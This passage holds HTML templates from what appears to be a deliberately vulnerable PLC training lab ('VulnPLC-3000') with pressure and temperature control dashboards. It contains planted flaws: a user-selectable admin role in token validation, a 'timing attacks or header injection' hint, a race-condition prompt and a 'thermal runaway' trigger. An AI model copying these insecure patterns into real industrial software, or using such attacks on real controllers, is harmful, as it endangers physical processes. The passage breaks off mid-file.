    <title>My Logs - VulnPLC-3000</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #f5f5f5;
        }
        .navbar {
            background: #2c3e50;
            color: white;
            padding: 15px 30px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .navbar h1 { font-size: 20px; }
        .navbar a { color: white; text-decoration: none; margin-left: 20px; }
        .container {
            max-width: 1200px;
            margin: 30px auto;
            padding: 0 20px;
        }
        .card {
            background: white;
            border-radius: 10px;
            padding: 25px;
            margin-bottom: 20px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }
        .card h2 {
            margin-bottom: 20px;
            color: #2c3e50;
            border-bottom: 2px solid #3498db;
            padding-bottom: 10px;
        }
        table {
            width: 100%;
            border-collapse: collapse;
        }
        th, td {
            padding: 12px;
            text-align: left;
            border-bottom: 1px solid #ddd;
        }
        th {
            background: #3498db;
            color: white;
            font-weight: 500;
        }
        tr:hover { background: #f5f5f5; }
        .info-box {
            background: #e8f4f8;
            padding: 15px;
            border-radius: 5px;
            margin-bottom: 20px;
            border-left: 4px solid #3498db;
        }
        .badge {
            padding: 4px 8px;
            border-radius: 3px;
            font-size: 12px;
            font-weight: 500;
        }
        .badge-read { background: #d4edda; color: #155724; }
        .badge-write { background: #fff3cd; color: #856404; }
        .badge-control { background: #f8d7da; color: #721c24; }
    </style>
</head>
<body>
    <div class="navbar">
        <h1>ðŸ“‹ My Activity Logs</h1>
        <div>
            <a href="/dashboard">Dashboard</a>
            <a href="/operator/search">Search Logs</a>
            <a href="/logout">Logout</a>
        </div>
    </div>

    <div class="container">
        <div class="card">
            <h2>Your Recent Activities</h2>

            <div class="info-box">
                <strong>ðŸ’¡ Info:</strong> This shows only your activities. Admins can see all logs.
            </div>

            <table>
                <thead>
                    <tr>
                        <th>Timestamp</th>
                        <th>Action</th>
                        <th>Details</th>
                        <th>IP Address</th>
                    </tr>
                </thead>
                <tbody>
                    {% for log in logs %}
                    <tr>
                        <td>{{ log[4] }}</td>
                        <td>
                            <span class="badge badge-{{ 'read' if 'view' in log[2] or 'read' in log[2] else ('write' if 'update' in log[2] or 'create' in log[2] else 'control') }}">
                                {{ log[2] }}
                            </span>
                        </td>
                        <td>{{ log[3] }}</td>
                        <td>{{ log[5] }}</td>
                    </tr>
                    {% else %}
                    <tr>
                        <td colspan="4" style="text-align: center; padding: 40px; color: #999;">
                            No activity logs found for your account
                        </td>
                    </tr>
                    {% endfor %}
                </tbody>
            </table>
        </div>

        <div class="card">
            <h2>Quick Stats</h2>
            <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px;">
                <div style="background: #e8f4f8; padding: 20px; border-radius: 5px; text-align: center;">
                    <div style="font-size: 32px; font-weight: bold; color: #3498db;">{{ logs|length }}</div>
                    <div style="color: #7f8c8d; margin-top: 5px;">Total Actions</div>
                </div>
                <div style="background: #fef5e7; padding: 20px; border-radius: 5px; text-align: center;">
                    <div style="font-size: 32px; font-weight: bold; color: #f39c12;">{{ username }}</div>
                    <div style="color: #7f8c8d; margin-top: 5px;">Username</div>
                </div>
                <div style="background: #e8f8f5; padding: 20px; border-radius: 5px; text-align: center;">
                    <div style="font-size: 32px; font-weight: bold; color: #1abc9c;">{{ role }}</div>
                    <div style="color: #7f8c8d; margin-top: 5px;">Role</div>
                </div>
            </div>
        </div>
    </div>
</body>
</html>



================================================================================
FILE: templates/operator_token.html
================================================================================
<!DOCTYPE html>
<html>
<head>
    <title>API Token - VulnPLC-3000</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #f5f5f5;
        }
        .navbar {
            background: #2c3e50;
            color: white;
            padding: 15px 30px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .navbar h1 { font-size: 20px; }
        .navbar a { color: white; text-decoration: none; margin-left: 20px; }
        .container {
            max-width: 1000px;
            margin: 30px auto;
            padding: 0 20px;
        }
        .card {
            background: white;
            border-radius: 10px;
            padding: 25px;
            margin-bottom: 20px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }
        .card h2 {
            margin-bottom: 20px;
            color: #2c3e50;
            border-bottom: 2px solid #34495e;
            padding-bottom: 10px;
        }
        .token-box {
            background: #f8f9fa;
            padding: 20px;
            border-radius: 5px;
            border: 2px dashed #dee2e6;
            margin: 20px 0;
            word-break: break-all;
            font-family: 'Courier New', monospace;
            font-size: 16px;
            color: #2c3e50;
        }
        .info-box {
            background: #e8f4f8;
            padding: 15px;
            border-radius: 5px;
            margin-bottom: 20px;
            border-left: 4px solid #3498db;
        }
        .warning {
            background: #fff3cd;
            border-left-color: #ffc107;
            color: #856404;
        }
        button {
            padding: 12px 30px;
            background: #34495e;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
            margin-right: 10px;
        }
        button:hover { background: #2c3e50; }
        code {
            background: #f4f4f4;
            padding: 2px 6px;
            border-radius: 3px;
            font-family: 'Courier New', monospace;
        }
        .detail-row {
            padding: 10px;
            border-bottom: 1px solid #ecf0f1;
            display: flex;
            justify-content: space-between;
        }
        .detail-label {
            font-weight: 500;
            color: #7f8c8d;
        }
        .detail-value {
            font-family: 'Courier New', monospace;
            color: #2c3e50;
        }
        .copy-btn {
            background: #1abc9c;
            padding: 8px 15px;
            font-size: 14px;
            margin-top: 10px;
        }
        .copy-btn:hover {
            background: #16a085;
        }
    </style>
</head>
<body>
    <div class="navbar">
        <h1>ðŸ”‘ API Token Generator</h1>
        <div>
            <a href="/dashboard">Dashboard</a>
            <a href="/operator/logs">My Logs</a>
            <a href="/logout">Logout</a>
        </div>
    </div>

    <div class="container">
        <div class="card">
            <h2>Your API Token</h2>

            <div class="info-box">
                <strong>ðŸ’¡ Info:</strong> Use this token to authenticate API requests to the VulnPLC-3000 system.
            </div>

            {% if token_data %}
            <div class="token-box">
                {{ token_data.token }}
                <button class="copy-btn" onclick="copyToken()">ðŸ“‹ Copy Token</button>
            </div>

            <div style="margin-top: 20px;">
                <div class="detail-row">
                    <span class="detail-label">Username:</span>
                    <span class="detail-value">{{ token_data.username }}</span>
                </div>
                <div class="detail-row">
                    <span class="detail-label">Role:</span>
                    <span class="detail-value">{{ token_data.role }}</span>
                </div>
                <div class="detail-row">
                    <span class="detail-label">Generated:</span>
                    <span class="detail-value">{{ token_data.timestamp }}</span>
                </div>
                <div class="detail-row" style="border-bottom: none;">
                    <span class="detail-label">Format:</span>
                    <span class="detail-value" style="font-size: 12px;">{{ token_data.hint }}</span>
                </div>
            </div>
            {% else %}
            <p style="color: #7f8c8d; margin: 20px 0;">No token generated yet. Click the button below to generate a new token.</p>
            {% endif %}

            <form method="POST" action="/operator/token" style="margin-top: 20px;">
                <button type="submit">ðŸ”„ Generate New Token</button>
            </form>
        </div>

        <div class="card">
            <h2>Token Validation</h2>

            <div class="info-box warning">
                <strong>âš ï¸ Testing:</strong> Validate tokens to check if they're still active and authorized.
            </div>

            <form method="POST" action="/operator/validate">
                <div style="margin-bottom: 15px;">
                    <label style="display: block; margin-bottom: 5px; font-weight: 500; color: #2c3e50;">Token to Validate</label>
                    <input type="text" name="token" style="width: 100%; padding: 10px; border: 1px solid #ddd; border-radius: 5px; font-family: 'Courier New', monospace;" placeholder="Enter token..." required>
                </div>

                <div style="margin-bottom: 15px;">
                    <label style="display: block; margin-bottom: 5px; font-weight: 500; color: #2c3e50;">Username</label>
                    <input type="text" name="username" style="width: 100%; padding: 10px; border: 1px solid #ddd; border-radius: 5px;" value="{{ username }}" required>
                </div>

                <div style="margin-bottom: 15px;">
                    <label style="display: block; margin-bottom: 5px; font-weight: 500; color: #2c3e50;">Role</label>
                    <select name="role" style="width: 100%; padding: 10px; border: 1px solid #ddd; border-radius: 5px;">
                        <option value="operator" {% if role == 'operator' %}selected{% endif %}>Operator</option>
                        <option value="admin">Admin</option>
                        <option value="guest">Guest</option>
                    </select>
                </div>

                <button type="submit" style="background: #3498db;">âœ“ Validate Token</button>
            </form>

            {% if validation_result %}
            <div style="background: {% if validation_result.valid %}#d4edda{% else %}#f8d7da{% endif %}; padding: 15px; border-radius: 5px; margin-top: 20px; border-left: 4px solid {% if validation_result.valid %}#28a745{% else %}#dc3545{% endif %};">
                <strong>{% if validation_result.valid %}âœ“ Valid Token{% else %}âœ— Invalid Token{% endif %}</strong>
                <p style="margin-top: 5px;">{{ validation_result.message }}</p>
            </div>
            {% endif %}
        </div>

        <div class="card">
            <h2>API Usage Examples</h2>

            <pre style="background: #f4f4f4; padding: 15px; border-radius: 5px; overflow-x: auto; margin-bottom: 15px;"># Using token in API requests
curl http://localhost:5000/api/plc/status \
  -H "Authorization: Bearer YOUR_TOKEN"

# Read register with token
curl http://localhost:5000/api/plc/read/0 \
  -H "Authorization: Bearer YOUR_TOKEN"

# Write to register with token
curl -X POST http://localhost:5000/api/plc/write \
  -H "Authorization: Bearer YOUR_TOKEN" \
  -d "register=0&value=42"</pre>

            <div class="info-box">
                <strong>ðŸ“– Documentation:</strong> See the API reference for complete endpoint documentation and authentication requirements.
            </div>
        </div>
    </div>

    <script>
        function copyToken() {
            const tokenText = document.querySelector('.token-box').textContent.trim().split('\n')[0];
            navigator.clipboard.writeText(tokenText).then(() => {
                const btn = document.querySelector('.copy-btn');
                const originalText = btn.textContent;
                btn.textContent = 'âœ“ Copied!';
                btn.style.background = '#27ae60';
                setTimeout(() => {
                    btn.textContent = originalText;
                    btn.style.background = '#1abc9c';
                }, 2000);
            });
        }
    </script>
</body>
</html>



================================================================================
FILE: templates/plc2_dashboard.html
================================================================================
<!DOCTYPE html>
<html>
<head>
    <title>PLC-2: Pressure Control Dashboard</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #0f0f1e;
            color: #fff;
        }
        .header {
            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
            padding: 15px 30px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            box-shadow: 0 2px 10px rgba(0,0,0,0.5);
        }
        .header h1 { font-size: 24px; }
        .header .user-info { font-size: 14px; }
        .container {
            padding: 30px;
            max-width: 1400px;
            margin: 0 auto;
        }
        .grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 20px;
            margin-bottom: 20px;
        }
        .card {
            background: #1a1a2e;
            border-radius: 10px;
            padding: 20px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.3);
        }
        .card h2 {
            font-size: 18px;
            margin-bottom: 15px;
            color: #64b5f6;
        }
        .gauge {
            width: 100%;
            height: 120px;
            background: #0f0f1e;
            border-radius: 10px;
            display: flex;
            justify-content: center;
            align-items: center;
            font-size: 32px;
            font-weight: bold;
            margin: 10px 0;
        }
        .gauge.normal { color: #4caf50; }
        .gauge.warning { color: #ff9800; background: rgba(255, 152, 0, 0.1); }
        .gauge.danger { color: #f44336; background: rgba(244, 67, 54, 0.1); }
        .control-group {
            margin: 15px 0;
        }
        .control-group label {
            display: block;
            margin-bottom: 5px;
            font-size: 14px;
            color: #b0bec5;
        }
        .switch {
            display: inline-block;
            width: 60px;
            height: 30px;
            background: #f44336;
            border-radius: 15px;
            position: relative;
            cursor: pointer;
            transition: 0.3s;
        }
        .switch.on { background: #4caf50; }
        .switch::after {
            content: '';
            width: 26px;
            height: 26px;
            background: white;
            border-radius: 50%;
            position: absolute;
            top: 2px;
            left: 2px;
            transition: 0.3s;
        }
        .switch.on::after { left: 32px; }
        .slider {
            width: 100%;
            margin: 10px 0;
        }
        input[type="range"] {
            width: 100%;
            height: 8px;
            background: #37474f;
            border-radius: 5px;
            outline: none;
        }
        button {
            padding: 10px 20px;
            background: #1e88e5;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            margin: 5px;
            font-size: 14px;
        }
        button:hover { background: #1565c0; }
        button.danger { background: #f44336; }
        button.danger:hover { background: #d32f2f; }
        .status-indicator {
            display: inline-block;
            width: 12px;
            height: 12px;
            border-radius: 50%;
            margin-right: 8px;
        }
        .status-indicator.on { background: #4caf50; }
        .status-indicator.off { background: #757575; }
        .alarm {
            background: rgba(244, 67, 54, 0.2);
            border-left: 4px solid #f44336;
            padding: 10px;
            margin: 10px 0;
            border-radius: 5px;
        }
    </style>
</head>
<body>
    <div class="header">
        <h1>ðŸ­ PLC-2: Pressure Control System</h1>
        <div class="user-info">
            User: {{ username }} | <a href="/logout" style="color: white;">Logout</a>
        </div>
    </div>

    <div class="container">
        <div class="grid">
            <!-- Pressure Vessel 1 -->
            <div class="card">
                <h2>Pressure Vessel 1</h2>
                <div class="gauge" id="pressure1">
                    <span id="pressure1-value">{{ state.get('pressure_vessel_1', 0)|round(1) }} PSI</span>
                </div>
                <div class="control-group">
                    <label>Compressor 1</label>
                    <div class="switch" id="comp1-switch" onclick="toggleCompressor(1)"></div>
                </div>
                <div class="control-group">
                    <label>Speed: <span id="comp1-speed-val">50</span>%</label>
                    <input type="range" id="comp1-speed" min="0" max="100" value="50" oninput="setCompressorSpeed(1, this.value)">
                </div>
                <div class="control-group">
                    <label>Relief Valve 1</label>
                    <div class="switch" id="valve1-switch" onclick="toggleValve(1)"></div>
                </div>
            </div>

            <!-- Pressure Vessel 2 -->
            <div class="card">
                <h2>Pressure Vessel 2</h2>
                <div class="gauge" id="pressure2">
                    <span id="pressure2-value">{{ state.get('pressure_vessel_2', 0)|round(1) }} PSI</span>
                </div>
                <div class="control-group">
                    <label>Compressor 2</label>
                    <div class="switch" id="comp2-switch" onclick="toggleCompressor(2)"></div>
                </div>
                <div class="control-group">
                    <label>Speed: <span id="comp2-speed-val">50</span>%</label>
                    <input type="range" id="comp2-speed" min="0" max="100" value="50" oninput="setCompressorSpeed(2, this.value)">
                </div>
                <div class="control-group">
                    <label>Relief Valve 2</label>
                    <div class="switch" id="valve2-switch" onclick="toggleValve(2)"></div>
                </div>
            </div>

            <!-- Emergency Controls -->
            <div class="card">
                <h2>Emergency Controls</h2>
                <div class="control-group">
                    <button class="danger" onclick="emergencyVent()">EMERGENCY VENT</button>
                    <button onclick="resetSystem()">Reset System</button>
                </div>
                <div id="alarms-container"></div>
            </div>
        </div>

        <!-- System Status -->
        <div class="card">
            <h2>System Status</h2>
            <div style="display: grid; grid-template-columns: repeat(2, 1fr); gap: 15px;">
                <div>
                    <span class="status-indicator" id="comp1-status"></span>
                    Compressor 1: <span id="comp1-status-text">OFF</span>
                </div>
                <div>
                    <span class="status-indicator" id="comp2-status"></span>
                    Compressor 2: <span id="comp2-status-text">OFF</span>
                </div>
                <div>
                    <span class="status-indicator" id="valve1-status"></span>
                    Relief Valve 1: <span id="valve1-status-text">CLOSED</span>
                </div>
                <div>
                    <span class="status-indicator" id="valve2-status"></span>
                    Relief Valve 2: <span id="valve2-status-text">CLOSED</span>
                </div>
            </div>
        </div>
    </div>

    <script>
        function updateStatus() {
            fetch('/api/status')
                .then(r => r.json())
                .then(data => {
                    const state = data.state;

                    // Update pressure gauges
                    updateGauge('pressure1', state.pressure_vessel_1 || 0);
                    updateGauge('pressure2', state.pressure_vessel_2 || 0);

                    // Update compressor status
                    updateSwitch('comp1-switch', state.compressor_1_status);
                    updateSwitch('comp2-switch', state.compressor_2_status);
                    updateSwitch('valve1-switch', state.relief_valve_1);
                    updateSwitch('valve2-switch', state.relief_valve_2);

                    // Update status indicators
                    updateIndicator('comp1-status', state.compressor_1_status);
                    updateIndicator('comp2-status', state.compressor_2_status);
                    updateIndicator('valve1-status', state.relief_valve_1);
                    updateIndicator('valve2-status', state.relief_valve_2);

                    // Update status text
                    document.getElementById('comp1-status-text').textContent = state.compressor_1_status ? 'ON' : 'OFF';
                    document.getElementById('comp2-status-text').textContent = state.compressor_2_status ? 'ON' : 'OFF';
                    document.getElementById('valve1-status-text').textContent = state.relief_valve_1 ? 'OPEN' : 'CLOSED';
                    document.getElementById('valve2-status-text').textContent = state.relief_valve_2 ? 'OPEN' : 'CLOSED';

                    // Check for alarms
                    checkAlarms(state);
                });
        }

        function updateGauge(id, value) {
            const elem = document.getElementById(id);
            const valElem = document.getElementById(id + '-value');
            valElem.textContent = value.toFixed(1) + ' PSI';

            elem.className = 'gauge';
            if (value > 140) elem.classList.add('danger');
            else if (value > 120) elem.classList.add('warning');
            else elem.classList.add('normal');
        }

        function updateSwitch(id, state) {
            const elem = document.getElementById(id);
            if (state) elem.classList.add('on');
            else elem.classList.remove('on');
        }

        function updateIndicator(id, state) {
            const elem = document.getElementById(id);
            if (state) elem.classList.add('on');
            else elem.classList.remove('on');
        }

        function toggleCompressor(num) {
            const switchElem = document.getElementById('comp' + num + '-switch');
            const newState = !switchElem.classList.contains('on');

            fetch('/api/control', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    action: 'compressor_' + num + '_status',
                    value: newState
                })
            }).then(() => updateStatus());
        }

        function setCompressorSpeed(num, value) {
            document.getElementById('comp' + num + '-speed-val').textContent = value;

            fetch('/api/control', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    action: 'compressor_' + num + '_speed',
                    value: parseInt(value)
                })
            });
        }

        function toggleValve(num) {
            const switchElem = document.getElementById('valve' + num + '-switch');
            const newState = !switchElem.classList.contains('on');

            fetch('/api/control', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    action: 'relief_valve_' + num,
                    value: newState
                })
            }).then(() => updateStatus());
        }

        function emergencyVent() {
            if (confirm('Activate emergency vent? This will rapidly depressurize both vessels!')) {
                fetch('/api/control', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        action: 'emergency_vent',
                        value: true
                    })
                }).then(() => {
                    setTimeout(() => {
                        fetch('/api/control', {
                            method: 'POST',
                            headers: {'Content-Type': 'application/json'},
                            body: JSON.stringify({
                                action: 'emergency_vent',
                                value: false
                            })
                        });
                    }, 3000);
                });
            }
        }

        function resetSystem() {
            location.reload();
        }

        function checkAlarms(state) {
            const container = document.getElementById('alarms-container');
            const alarms = [];

            if (state.high_pressure_alarm_1) alarms.push('HIGH PRESSURE - Vessel 1');
            if (state.high_pressure_alarm_2) alarms.push('HIGH PRESSURE - Vessel 2');
            if (state.low_pressure_alarm_1) alarms.push('LOW PRESSURE - Vessel 1');
            if (state.low_pressure_alarm_2) alarms.push('LOW PRESSURE - Vessel 2');

            if (alarms.length > 0) {
                container.innerHTML = alarms.map(a => `<div class="alarm">âš ï¸ ${a}</div>`).join('');
            } else {
                container.innerHTML = '';
            }
        }

        // Update every 2 seconds
        setInterval(updateStatus, 2000);
        updateStatus();
    </script>
</body>
</html>



================================================================================
FILE: templates/plc2_login.html
================================================================================
<!DOCTYPE html>
<html>
<head>
    <title>PLC-2: Pressure Control Login</title>
    <style>
        body {
            font-family: 'Courier New', monospace;
            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .login-container {
            background: #fff;
            padding: 40px;
            border-radius: 10px;
            box-shadow: 0 10px 40px rgba(0,0,0,0.3);
            width: 350px;
        }
        h1 {
            color: #1e3c72;
            text-align: center;
            margin-bottom: 10px;
            font-size: 24px;
        }
        .plc-id {
            text-align: center;
            color: #666;
            font-size: 12px;
            margin-bottom: 20px;
        }
        .error {
            background: #ffebee;
            color: #c62828;
            padding: 10px;
            border-radius: 5px;
            margin-bottom: 20px;
            font-size: 14px;
        }
        input {
            width: 100%;
            padding: 12px;
            margin: 10px 0;
            border: 1px solid #ddd;
            border-radius: 5px;
            box-sizing: border-box;
            font-size: 14px;
        }
        button {
            width: 100%;
            padding: 12px;
            background: #1e3c72;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
            margin-top: 10px;
        }
        button:hover {
            background: #2a5298;
        }
        .info {
            margin-top: 20px;
            padding: 15px;
            background: #f5f5f5;
            border-radius: 5px;
            font-size: 12px;
        }
        .vuln-hint {
            color: #d32f2f;
            font-size: 11px;
            margin-top: 10px;
            text-align: center;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <h1>ðŸ­ PLC-2 Access</h1>
        <div class="plc-id">Pressure Control System</div>

        {% if error %}
        <div class="error">{{ error }}</div>
        {% endif %}

        <form method="POST">
            <input type="text" name="username" placeholder="Username" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Login</button>
        </form>

        <div class="info">
            <strong>System Information:</strong><br>
            Model: VulnPLC-2000-PSI<br>
            Firmware: v1.2.3<br>
            Port: 5011 (HTTP) / 5503 (Modbus)
        </div>

        <div class="vuln-hint">
            Hint: Try timing attacks or header injection
        </div>
    </div>
</body>
</html>



================================================================================
FILE: templates/plc3_dashboard.html
================================================================================
<!DOCTYPE html>
<html>
<head>
    <title>PLC-3: Temperature Control Dashboard</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #0f0f1e;
            color: #fff;
        }
        .header {
            background: linear-gradient(135deg, #d32f2f 0%, #f44336 100%);
            padding: 15px 30px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            box-shadow: 0 2px 10px rgba(0,0,0,0.5);
        }
        .header h1 { font-size: 24px; }
        .container {
            padding: 30px;
            max-width: 1400px;
            margin: 0 auto;
        }
        .grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(350px, 1fr));
            gap: 20px;
            margin-bottom: 20px;
        }
        .card {
            background: #1a1a2e;
            border-radius: 10px;
            padding: 20px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.3);
        }
        .card h2 {
            font-size: 18px;
            margin-bottom: 15px;
            color: #ff6b6b;
        }
        .temp-display {
            width: 100%;
            height: 100px;
            background: #0f0f1e;
            border-radius: 10px;
            display: flex;
            justify-content: center;
            align-items: center;
            font-size: 36px;
            font-weight: bold;
            margin: 10px 0;
        }
        .temp-cold { color: #64b5f6; }
        .temp-normal { color: #4caf50; }
        .temp-warm { color: #ff9800; }
        .temp-hot { color: #f44336; background: rgba(244, 67, 54, 0.1); }
        .control-group {
            margin: 15px 0;
        }
        .control-group label {
            display: block;
            margin-bottom: 5px;
            font-size: 14px;
            color: #b0bec5;
        }
        .switch {
            display: inline-block;
            width: 60px;
            height: 30px;
            background: #666;
            border-radius: 15px;
            position: relative;
            cursor: pointer;
            transition: 0.3s;
        }
        .switch.heater-on { background: #ff6b6b; }
        .switch.cooler-on { background: #64b5f6; }
        .switch::after {
            content: '';
            width: 26px;
            height: 26px;
            background: white;
            border-radius: 50%;
            position: absolute;
            top: 2px;
            left: 2px;
            transition: 0.3s;
        }
        .switch.heater-on::after, .switch.cooler-on::after { left: 32px; }
        input[type="range"] {
            width: 100%;
            margin: 10px 0;
        }
        button {
            padding: 10px 20px;
            background: #1e88e5;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            margin: 5px;
        }
        button:hover { background: #1565c0; }
        button.danger { background: #f44336; }
        button.danger:hover { background: #d32f2f; }
    </style>
</head>
<body>
    <div class="header">
        <h1>ðŸŒ¡ï¸ PLC-3: Temperature Control System</h1>
        <div>User: {{ username }} | <a href="/logout" style="color: white;">Logout</a></div>
    </div>

    <div class="container">
        <div class="grid">
            <!-- Zone 1 -->
            <div class="card">
                <h2>Zone 1</h2>
                <div class="temp-display temp-normal" id="zone1-temp">
                    <span id="zone1-value">{{ state.get('zone1_temp', 25)|round(1) }}Â°C</span>
                </div>
                <div class="control-group">
                    <label>Heater 1</label>
                    <div class="switch" id="heater1-switch" onclick="toggleHeater(1)"></div>
                    <label>Power: <span id="heater1-power-val">50</span>%</label>
                    <input type="range" id="heater1-power" min="0" max="100" value="50" oninput="setHeaterPower(1, this.value)">
                </div>
                <div class="control-group">
                    <label>Cooler 1</label>
                    <div class="switch" id="cooler1-switch" onclick="toggleCooler(1)"></div>
                    <label>Power: <span id="cooler1-power-val">50</span>%</label>
                    <input type="range" id="cooler1-power" min="0" max="100" value="50" oninput="setCoolerPower(1, this.value)">
                </div>
            </div>

            <!-- Zone 2 -->
            <div class="card">
                <h2>Zone 2</h2>
                <div class="temp-display temp-normal" id="zone2-temp">
                    <span id="zone2-value">{{ state.get('zone2_temp', 25)|round(1) }}Â°C</span>
                </div>
                <div class="control-group">
                    <label>Heater 2</label>
                    <div class="switch" id="heater2-switch" onclick="toggleHeater(2)"></div>
                    <label>Power: <span id="heater2-power-val">50</span>%</label>
                    <input type="range" id="heater2-power" min="0" max="100" value="50" oninput="setHeaterPower(2, this.value)">
                </div>
                <div class="control-group">
                    <label>Cooler 2</label>
                    <div class="switch" id="cooler2-switch" onclick="toggleCooler(2)"></div>
                    <label>Power: <span id="cooler2-power-val">50</span>%</label>
                    <input type="range" id="cooler2-power" min="0" max="100" value="50" oninput="setCoolerPower(2, this.value)">
                </div>
            </div>

            <!-- Zone 3 -->
            <div class="card">
                <h2>Zone 3</h2>
                <div class="temp-display temp-normal" id="zone3-temp">
                    <span id="zone3-value">{{ state.get('zone3_temp', 25)|round(1) }}Â°C</span>
                </div>
                <div class="control-group">
                    <label>Heater 3</label>
                    <div class="switch" id="heater3-switch" onclick="toggleHeater(3)"></div>
                    <label>Power: <span id="heater3-power-val">50</span>%</label>
                    <input type="range" id="heater3-power" min="0" max="100" value="50" oninput="setHeaterPower(3, this.value)">
                </div>
                <div class="control-group">
                    <label>Cooler 3</label>
                    <div class="switch" id="cooler3-switch" onclick="toggleCooler(3)"></div>
                    <label>Power: <span id="cooler3-power-val">50</span>%</label>
                    <input type="range" id="cooler3-power" min="0" max="100" value="50" oninput="setCoolerPower(3, this.value)">
                </div>
            </div>
        </div>

        <div class="card">
            <h2>âš ï¸ Dangerous Controls</h2>
            <button class="danger" onclick="triggerThermalRunaway()">TRIGGER THERMAL RUNAWAY</button>
            <button onclick="testRaceCondition()">Test Race Condition</button>
            <p style="margin-top: 10px; font-size: 12px; color: #ff9800;">
                Warning: These controls can cause unsafe conditions. For testing only!
            </p>
        </div>
    </div>

    <script>
        function updateStatus() {
            fetch('/api/status')
                .then(r => r.json())
                .then(data => {
                    const state = data.state;

                    // Update temperature displays
                    updateTempDisplay('zone1', state.zone1_temp || 25);
                    updateTempDisplay('zone2', state.zone2_temp || 25);
                    updateTempDisplay('zone3', state.zone3_temp || 25);

                    // Update switches
                    updateSwitch('heater1-switch', state.heater1_status, 'heater');
                    updateSwitch('heater2-switch', state.heater2_status, 'heater');
                    updateSwitch('heater3-switch', state.heater3_status, 'heater');
                    updateSwitch('cooler1-switch', state.cooler1_status, 'cooler');
                    updateSwitch('cooler2-switch', state.cooler2_status, 'cooler');
                    updateSwitch('cooler3-switch', state.cooler3_status, 'cooler');
                });
        }

        function updateTempDisplay(zone, temp) {
            const elem = document.getElementById(zone + '-temp');
            const valElem = document.getElementById(zone + '-value');
            valElem.textContent = temp.toFixed(1) + 'Â°C';

            elem.className = 'temp-display';
            if (temp < 15) elem.classList.add('temp-cold');
            else if (temp < 30) elem.classList.add('temp-normal');
            else if (temp < 50) elem.classList.add('temp-warm');
            else elem.classList.add('temp-hot');
        }

        function updateSwitch(id, state, type) {
            const elem = document.getElementById(id);
            elem.className = 'switch';
            if (state) {
                elem.classList.add(type + '-on');
            }
        }

        function toggleHeater(num) {
            const switchElem = document.getElementById('heater' + num + '-switch');
            const newState = !switchElem.classList.contains('heater-on');

            fetch('/api/control', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    action: 'heater' + num + '_status',
                    value: newState
                })
            }).then(() => updateStatus());
        }

        function toggleCooler(num) {
            const switchElem = document.getElementById('cooler' + num + '-switch');
            const newState = !switchElem.classList.contains('cooler-on');

            fetch('/api/control', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    action: 'cooler' + num + '_status',
                    value: newState
                })
            }).then(() => updateStatus());
        }

        function setHeaterPower(num, value) {
            document.getElementById('heater' + num + '-power-val').textContent = value;
            fetch('/api/control', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    action: 'heater' + num + '_power',
                    value: parseInt(value)
                })
            });
        }

        function setCoolerPower(num, value) {
            document.getElementById('cooler' + num + '-power-val').textContent = value;
            fetch('/api/control', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    action: 'cooler' + num + '_power',
                    value: parseInt(value)
                })
            });
        }

        function triggerThermalRunaway() {
            if (confirm('This will cause uncontrolled temperature rise! Continue?')) {
                fetch('/api/control', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        action: 'thermal_runaway',
                        value: true
                    })
                }).then(() => alert('Thermal runaway triggered!'));
            }
        }

        function testRaceCondition() {
            alert('Send multiple concurrent requests to /api/race_test to exploit race condition');
        }

        setInterval(updateStatus, 2000);
        updateStatus();
    </script>
</body>
</html>



================================================================================
FILE: templates/plc3_login.html
================================================================================
<!DOCTYPE html>
<html>
<head>
    <title>PLC-3: Temperature Control Login</title>
    <style>
        body {
            font-family: 'Courier New', monospace;
            background: linear-gradient(135deg, #d32f2f 0%, #f44336 100%);
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .login-container {
            background: #fff;
            padding: 40px;
            border-radius: 10px;
            box-shadow: 0 10px 40px rgba(0,0,0,0.3);
            width: 350px;
        }
        h1 {
            color: #d32f2f;
            text-align: center;
            margin-bottom: 10px;
            font-size: 24px;
        }
        .plc-id {
